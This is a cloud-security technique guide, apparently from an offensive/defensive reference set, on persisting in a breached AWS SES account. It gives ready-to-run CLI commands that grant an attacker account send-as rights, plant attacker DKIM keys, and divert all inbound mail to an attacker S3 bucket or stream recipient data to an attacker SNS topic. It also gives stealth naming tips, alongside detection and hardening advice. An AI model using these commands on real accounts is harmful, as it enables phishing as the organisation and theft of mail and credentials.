---
cstg_id: CSTG-AWS-SES-PERSIST
title: "AWS Ses - Persistence"
provider: aws
service: ses
phase: persistence
required_access: assumed-breach
required_permissions:
  - ses:PutIdentityPolicy
  - ses:VerifyDomainIdentity
  - ses:VerifyDomainDkim
  - ses:CreateEmailIdentity
  - ses:SetIdentityDkimEnabled
  - ses:SetIdentityMailFromDomain
  - ses:CreateReceiptRule
  - ses:CreateReceiptRuleSet
  - ses:SetActiveReceiptRuleSet
  - ses:UpdateReceiptRule
  - ses:CreateConfigurationSet
  - ses:CreateConfigurationSetEventDestination
  - sesv2:PutEmailIdentityDkimSigningAttributes
  - sesv2:CreateEmailIdentityPolicy
references:
  - https://docs.aws.amazon.com/ses/latest/dg/sending-authorization-policies.html
  - https://docs.aws.amazon.com/ses/latest/dg/send-email-authentication-dkim.html
  - https://docs.aws.amazon.com/ses/latest/dg/mail-from.html
  - https://docs.aws.amazon.com/ses/latest/dg/receiving-email-receipt-rules.html
  - https://docs.aws.amazon.com/ses/latest/dg/monitor-using-event-publishing.html
  - https://hackingthe.cloud/aws/exploitation/ses_phishing/
license: CC BY-SA 4.0
---

## Summary

SES persistence techniques aim to retain a trusted send-as-the-organization capability and a mail-interception capability that survive credential rotation and routine review. Unlike compute persistence, SES footholds live in the email configuration plane — identity authorization policies, DKIM signing material, custom MAIL FROM, and inbound receipt rules — and are easy to overlook because email infrastructure is rarely re-audited after initial setup. The principal mechanisms are:

- **Delegated identity authorization policies** that let an attacker-controlled principal (often in a separate AWS account) keep sending as a verified domain even after the originally compromised identity is remediated.
- **DKIM signing hijack / BYODKIM** so the attacker controls signing material for a verified domain, or quietly adds a verified attacker subdomain that DKIM-signs as the brand.
- **Custom MAIL FROM** pointed at attacker-influenced DNS to keep SPF alignment under attacker control.
- **Standing inbound receipt rules** that continue copying mail (password resets, MFA, finance) to attacker-readable S3/Lambda/SNS.
- **Event destinations** on a configuration set that continuously stream recipient data to an attacker sink.

These build on the immediate abuse in [aws-ses-post-exploitation.md](../05-post-exploitation/aws-ses-post-exploitation.md); identity/quota discovery is in [aws-ses-enum.md](../02-services/aws-ses-enum.md).

## Prerequisites

- Credentials for a principal able to modify SES identity policies, DKIM/MAIL FROM attributes, receipt rules, or configuration-set event destinations.
- A verified domain identity in the target Region for sending persistence; SES inbound receiving enabled (supported Region + MX pointing at SES) for interception persistence.
- For DNS-backed techniques (BYODKIM, MAIL FROM, attacker subdomain), some control or influence over the domain's DNS (e.g. Route 53 in scope) makes the foothold durable.
- A destination account/bucket/function the attacker controls to receive delegated sends or intercepted mail.

## Enumeration

Baseline the current trust configuration so changes blend in and can be confirmed:

```bash
aws ses list-identity-policies --identity example.com --region us-east-1
aws ses get-identity-dkim-attributes --identities example.com --region us-east-1
aws ses get-identity-mail-from-domain-attributes --identities example.com --region us-east-1
aws ses describe-active-receipt-rule-set --region us-east-1
aws ses list-configuration-sets --region us-east-1
```

## Misconfigurations & Findings

- Identity authorization policies that name external account principals or wildcards — long-lived cross-account send rights.
- BYODKIM configured with externally supplied keys, or DKIM signing attributes changed outside a change window.
- Custom MAIL FROM domains whose DNS is not controlled by the organization.
- Inbound receipt rules with `S3Action`/`LambdaAction`/`SNSAction` targets in unexpected accounts, or catch-all `Recipients`.
- Configuration-set event destinations publishing to SNS/Firehose targets outside the organization.

## Exploitation

### ses:PutIdentityPolicy / sesv2:CreateEmailIdentityPolicy (delegated send persistence)

The most durable sending foothold: authorize an external principal to send as a verified identity. This survives rotation of the originally compromised IAM credentials because the grant lives on the SES resource, not on the principal.

```bash
aws ses put-identity-policy --region us-east-1 \
  --identity example.com --policy-name svc-notify \
  --policy '{
    "Version":"2012-10-17",
    "Statement":[{
      "Sid":"AllowDelegatedSend",
      "Effect":"Allow",
      "Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action":["ses:SendEmail","ses:SendRawEmail"],
      "Resource":"arn:aws:ses:us-east-1:VICTIM_ACCOUNT:identity/example.com"
    }]
  }'
```

Stealth: name the policy to resemble a legitimate integration (`svc-notify`, `crm-sync`) and use a tight-looking but attacker-owned principal. From the attacker account, sending then uses `--from-arn`/`--source-arn`/`--return-path-arn` referencing the victim identity.

### DKIM signing persistence (SetIdentityDkimEnabled / BYODKIM)

Bring-your-own-DKIM (BYODKIM) lets the attacker supply the private signing key for a verified domain, so they retain a key that produces valid DKIM signatures for the brand even if access is later trimmed:

```bash
# SES v2 — set externally supplied DKIM signing material (attacker holds the private key)
aws sesv2 put-email-identity-dkim-signing-attributes --region us-east-1 \
  --email-identity example.com \
  --signing-attributes-origin EXTERNAL \
  --signing-attributes DomainSigningSelector=sel1,DomainSigningPrivateKey=BASE64_PRIVATE_KEY
```

Alternatively, verify an attacker-controlled subdomain (`mail.example.com`) with Easy DKIM and keep it as a quietly-verified, DKIM-signing sender:

```bash
aws ses verify-domain-identity --domain mail.example.com --region us-east-1
aws ses verify-domain-dkim --domain mail.example.com --region us-east-1
aws ses set-identity-dkim-enabled --identity mail.example.com --dkim-enabled --region us-east-1
```

### ses:SetIdentityMailFromDomain (MAIL FROM persistence)

Point the custom MAIL FROM at a subdomain whose DNS the attacker influences, keeping SPF alignment under attacker control and providing another verified-looking sending path:

```bash
aws ses set-identity-mail-from-domain --identity example.com \
  --mail-from-domain bounce.example.com \
  --behavior-on-mx-failure UseDefaultValue --region us-east-1
```

### ses:CreateReceiptRule / ses:SetActiveReceiptRuleSet (interception persistence)

A standing receipt rule continuously diverts or copies inbound mail. Unlike the one-off use in post-exploitation, here the goal is a durable, low-noise rule embedded in the active rule set that keeps harvesting password-reset/MFA/finance mail:

```bash
aws ses create-receipt-rule --region us-east-1 \
  --rule-set-name default-rule-set \
  --after existing-first-rule \
  --rule '{
    "Name":"archive-compliance",
    "Enabled":true,
    "Recipients":[],                
    "Actions":[
      {"S3Action":{"BucketName":"attacker-archive","ObjectKeyPrefix":"in/"}}
    ]
  }'
```

Stealth choices: a benign name (`archive-compliance`), no `StopAction` so original delivery is unaffected, and placement after existing rules. An empty `Recipients` array captures all inbound mail for the domain.

### Configuration-set event destination (continuous data feed)

Attach an event destination that streams recipient addresses and message metadata to an attacker-owned SNS topic or Firehose stream, creating an ongoing leak that persists with the configuration set:

```bash
aws ses create-configuration-set --configuration-set Name=metrics --region us-east-1
aws ses create-configuration-set-event-destination --region us-east-1 \
  --configuration-set-name metrics \
  --event-destination '{
    "Name":"feed",
    "Enabled":true,
    "MatchingEventTypes":["send","delivery","open","click","bounce","complaint"],
    "SNSDestination":{"TopicARN":"arn:aws:sns:us-east-1:ATTACKER_ACCOUNT:feed"}
  }'
```

## Detection & Logging

These persistence actions are management-plane and **are** recorded in **CloudTrail** (`ses.amazonaws.com`) — they are the highest-value detection points for SES abuse:

- `PutIdentityPolicy`, `CreateEmailIdentityPolicy`
- `VerifyDomainIdentity`, `VerifyDomainDkim`, `CreateEmailIdentity`, `SetIdentityDkimEnabled`, `PutEmailIdentityDkimSigningAttributes`
- `SetIdentityMailFromDomain`
- `CreateReceiptRule`, `CreateReceiptRuleSet`, `SetActiveReceiptRuleSet`, `UpdateReceiptRule`
- `CreateConfigurationSet`, `CreateConfigurationSetEventDestination`

Detection signals: any identity-policy creation referencing an external account ID or wildcard principal; DKIM signing-attribute changes to `EXTERNAL` origin; new MAIL FROM domains; receipt-rule additions/edits to the active set, especially with `S3Action`/`Lambda`/`SNS` targets outside the org or empty `Recipients`; event destinations pointing at cross-account SNS/Firehose. Correlate the actor, source IP, and session with normal email-administration behavior. Remember that the resulting **sends are not in CloudTrail** — pair management-plane alerting with SES event-publishing and CloudWatch sending metrics to catch the downstream activity.

## Remediation & Hardening

- Periodically audit identity authorization policies; remove any external/wildcard principals. Enforce that `PutIdentityPolicy`/`CreateEmailIdentityPolicy` require change approval and alert.
- Inventory DKIM signing attributes; flag `EXTERNAL` (BYODKIM) origins and unexpected selectors; rotate keys and re-verify with Easy DKIM if tampering is suspected.
- Verify custom MAIL FROM domains resolve to org-controlled DNS only.
- Review the active receipt rule set on a schedule; alert on any create/update/activate; lock down target S3 buckets and Lambda functions with least-privilege resource policies and account-boundary controls (SCPs, bucket policies denying cross-account writes).
- Restrict configuration-set and event-destination management; verify SNS/Firehose targets are in-account.
- Use SCPs and IAM permission boundaries to deny SES identity-policy, DKIM, MAIL FROM, and receipt-rule modification to all but a small administrative role; require MFA.
- Enable SES event publishing to a SIEM and baseline sending to detect persistence being exercised.

## Tools

- AWS CLI (`aws ses`, `aws sesv2`) and SDKs for identity-policy, DKIM, MAIL FROM, receipt-rule, and event-destination operations.
- Cloud persistence/abuse frameworks with SES modules.
- CloudTrail / Athena and SIEM rules targeting the management-plane events listed above.
- IAM/SCP policy review tooling to confirm who can alter SES trust configuration.

## References

- SES sending authorization policies: https://docs.aws.amazon.com/ses/latest/dg/sending-authorization-policies.html
- Authenticating email with DKIM: https://docs.aws.amazon.com/ses/latest/dg/send-email-authentication-dkim.html
- Custom MAIL FROM domain: https://docs.aws.amazon.com/ses/latest/dg/mail-from.html
- SES receipt rules: https://docs.aws.amazon.com/ses/latest/dg/receiving-email-receipt-rules.html
- Monitoring using event publishing: https://docs.aws.amazon.com/ses/latest/dg/monitor-using-event-publishing.html
- hackingthe.cloud — SES phishing: https://hackingthe.cloud/aws/exploitation/ses_phishing/
